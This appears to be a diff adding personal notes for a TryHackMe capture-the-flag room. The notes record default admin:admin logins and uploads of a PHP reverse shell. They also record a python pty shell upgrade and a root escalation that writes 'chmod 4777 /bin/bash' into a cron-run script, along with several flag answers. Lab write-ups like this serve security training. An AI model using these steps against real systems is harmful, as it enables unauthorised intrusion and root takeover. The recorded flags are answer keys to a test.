@@ -1,0 +1,32 @@
+H1: Easy:
+22
+80
+8000
+robots.txt
+/vbcms 
+admin:admin
+change the password quickly!
+update one of the pages to be a php rev shell
+serv1
+/var/www/serv1/data/user.txt has the password, username, and cookie of 
+8001
+you can upload and run php from the support form
+8002
+try a free lesson
+used php-revshell, caught a shell
+get user serv3
+python3 -c "import pty;pty.spawn('/bin/bash')"
+export TERM = xterm
+flags
+/var/www/serv4/index.php
+THM{YmNlODZjN2I2ZDEwM2FlMDA5Y2RiYzZh}
+/var/lib/rary
+THM{Bet_You’re_Glad_This_Is_Not_A_Hash}
+cat /usr/games/fortune | base64 -d
+THM{NGI4Nzk4OGI3MDE4NDUzNWYwNjMyZjY1}
+priv esc
+linpeas shows /home/serv3/backups/backup.sh is executed every minute
+chmod 777 ~/backups/backup.sh
+echo "chmod 4777 /bin/bash" > backup.sh
+root flag
+THM{OWQyMGRlNWM0NjYzN2NmM2MxMDNkODgx}
